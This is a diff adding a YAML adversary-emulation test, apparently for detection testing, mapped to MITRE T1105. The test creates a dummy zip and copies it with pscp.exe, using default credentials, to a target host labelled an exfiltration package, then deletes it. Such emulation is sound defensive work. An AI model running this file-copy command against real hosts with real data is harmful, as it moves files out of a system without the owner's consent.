@@ -1,0 +1,48 @@
+api_version: "2.0"
+name: Remote File Copy using PSCP
+description: |
+    Copy a staged file using PSCP.exe to a public target location.
+args:
+    - name: scp_user
+      type: string
+      default: atomic
+    - name: scp_password
+      type: string
+      default: atomic
+    - name: scp_port
+      type: string
+      default: "22"
+    - name: exfil_package
+      type: path
+      default: C:\Temp\T1105_scp.zip
+    - name: target_location
+      type: string
+      default: 127.0.0.1
+    - name: target_filename
+      type: string
+      default: T1105_scp.zip
+    - name: pscp_url
+      type: string
+      default: https://the.earth.li/~sgtatham/putty/latest/w64/pscp.exe
+    - name: pscp_binary
+      type: string
+      default: PathToAtomicsFolder\..\ExternalPayloads\pscp.exe
+uuid: c82b1e60-c549-406f-9b00-0a8ae31c9cfe
+mitre:
+    tactics:
+        - 'TA0011: Command and Control'
+    techniques:
+        - 'T1105: Ingress Tool Transfer'
+requirements:
+    platforms:
+        - os: windows
+steps:
+    - name: remote-file-copy-using-pscp
+      inline: |
+        fsutil file createnew C:\Temp\T1105_scp.zip 1048576
+        echo y | {{.Args.pscp_binary}} -P {{.Args.scp_port}} -pw {{.Args.scp_password}} {{.Args.exfil_package}} {{.Args.scp_user}}@{{.Args.target_location}}:{{.Args.target_filename}}
+      executor: command_prompt
+      cleanup:
+        inline: |
+            del /f /q {{.Args.exfil_package}}
+        executor: command_prompt
